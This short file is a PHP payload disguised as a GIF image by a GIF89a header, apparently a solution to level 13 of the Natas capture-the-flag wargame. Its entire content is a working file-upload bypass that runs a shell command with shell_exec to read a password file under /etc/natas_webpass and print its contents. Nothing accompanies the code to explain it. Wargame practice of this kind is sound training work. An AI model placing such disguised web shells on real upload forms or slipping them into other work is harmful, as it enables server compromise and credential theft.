// shell command to be executed.

GIF89a
<?php
    $payload = shell_exec('cat /etc/natas_webpass/natas14');
    echo "The password for natas14 is: ";
    echo "$payload";
?>

